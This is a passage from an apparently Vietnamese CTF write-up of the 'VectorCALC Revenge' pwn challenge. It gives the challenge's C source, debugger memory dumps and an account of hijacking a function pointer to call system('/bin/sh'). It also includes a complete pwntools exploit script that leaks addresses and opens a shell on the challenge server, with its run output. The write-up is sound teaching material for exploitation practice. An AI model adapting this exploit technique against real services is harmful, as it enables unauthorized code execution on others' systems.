</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void init(){
</span></span><span style="display:flex;"><span>    setbuf(stdin,NULL);
</span></span><span style="display:flex;"><span>    setbuf(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i]<span style="color:#f92672">.</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printMenu(){
</span></span><span style="display:flex;"><span>    printf(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>int main(int argc, char<span style="color:#f92672">**</span> argv, char<span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    init();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        printMenu();
</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%u</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        switch (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            enterData();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            sumVector();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>            loadFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>            printFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span>:
</span></span><span style="display:flex;"><span>            addFavorute();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        default:
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void w1n(); <span style="color:#f92672">//</span> no more valid parameters to get shell <span style="color:#960050;background-color:#1e0010">!</span>
</span></span></code></pre></div><p>Ở bài này, tác giả đã sửa lại hàm <code>w1n()</code> một chút, ở tham số truyền vào lại là <code>echo '¯\\_(ツ)_/¯'</code> nên chúng ta không thể có shell :vv</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc                                                                                                                 <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">5</span>s <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> python3 xpl.py                                                                                                                                          <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Opening connection to <span style="color:#ae81ff">45.122.249.68</span> on port <span style="color:#ae81ff">20018</span><span style="color:#f92672">:</span> Done
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n<span style="color:#f92672">-</span>gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc<span style="color:#f92672">/</span>chall<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] pie_base :<span style="color:#ae81ff">0x55c01873b000</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] v_list array :<span style="color:#ae81ff">0x55c01873e040</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] sum :<span style="color:#ae81ff">0x55c01873e080</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] faves :<span style="color:#ae81ff">0x55c01873e098</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] w1n :<span style="color:#ae81ff">0x55c01873b9d2</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] system :<span style="color:#ae81ff">0x55c01873b100</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">¯\</span><span style="color:#a6e22e">_</span>(<span style="color:#960050;background-color:#1e0010">ツ</span>)_<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">¯</span>
</span></span></code></pre></div><p>Quay lại lúc nãy, chúng ta thực thi được hàm <code>w1n</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x558c6065298c</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">173</span><span style="color:#f92672">&gt;</span>    call   rdx                           <span style="color:#f92672">&lt;</span>w1n<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x558c60655030</span> (stdin<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fdff7ff6aa0</span> (_IO_2_1_stdin_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfbad208b</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x0</span>
</span></span></code></pre></div><p>Lúc này chúng ta cần điều khiển thanh ghi <code>rdi</code> trỏ đến chuỗi <code>/bin/sh\0</code> là được. Lúc gọi con trỏ hàm <code>((struct Vector *)sum)-&gt;printFunc(sum)</code> tham số của chúng ta là biến <code>sum</code>.</p>
<p>Mà <code>sum</code> lúc này đang trỏ đến <code>v_list-16</code>, do đó <code>rdi</code> chính xác đang trỏ đến <code>0x558c60655030 (stdin@GLIBC_2.2.5)</code> như trên hình</p>
<p>Điều chúng ta muốn bây giờ chính là <code>rdi-&gt;/bin/sh </code> , <code>rdx-&gt; w1n</code></p>
<p>-&gt; Khá là dễ dàng vì ta chỉ cần ghi vào 2 chunk trên v_list , chỉ số y của chunk này sẽ là <code>/bin/sh</code>, chỉ số x của chunk kế tiếp sẽ là địa chỉ hàm <code>w1n</code> (cách chính xác 16 bytes), ta sửa sum thành địa chỉ <code>/bin/sh</code> là sẽ có được shell</p>
<p>Mọi chuyện đã rõ ràng, ta bắt đầu thực hành:</p>
<p>Mình chỉnh sửa offset hàm w1n ngay chỗ thực hiện <code>call system</code> để tránh thanh ghi <code>rdi</code> được set cho giá trị rác</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31040</span> (v_list) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span> rax rdi <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31058</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31060</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31068</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31070</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">003</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31078</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0040</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31080</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31088</span> (sum) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39;
</span></span></span></code></pre></div><p>Vậy <code>sum -&gt; v_list+8</code>, khi gọi con trỏ hàm thì <code>v_list+24-&gt;w1n</code> sẽ được gọi, với <code>sum</code> đang chứa địa chỉ chuỗi <code>/bin/sh</code></p>
<p>-&gt; Nhưng không thành công có được shell vì bị stack alignment cả local và remote</p>
<p>-&gt; Mình thử thay thế bằng <code>system.plt</code> thì không dính stack aligment và thành công chiếm được shell</p>
<p>Sau đây là script exploit của mình
Vector Exploit:
<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=process(&#39;./chall_revenge&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;45.122.249.68&#39;</span>, <span style="color:#ae81ff">20018</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall_revenge&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009E4</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x68732f6e69622f</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(bin_sh)<span style="color:#f92672">.</span>encode(), str(bin_sh)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># enter(b&#39;1&#39;, str(w1n).encode(), str(w1n).encode())</span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, str(system)<span style="color:#f92672">.</span>encode(), str(system)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc/revenge                                                                                                               02:51:19 ─╮
</span></span><span style="display:flex;"><span>╰─❯ python3 xpl.py                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20018: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/revenge/chall_revenge&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x56172c10e000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x56172c111040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x56172c111080
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x56172c111098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x56172c10e9e4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x56172c10e100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
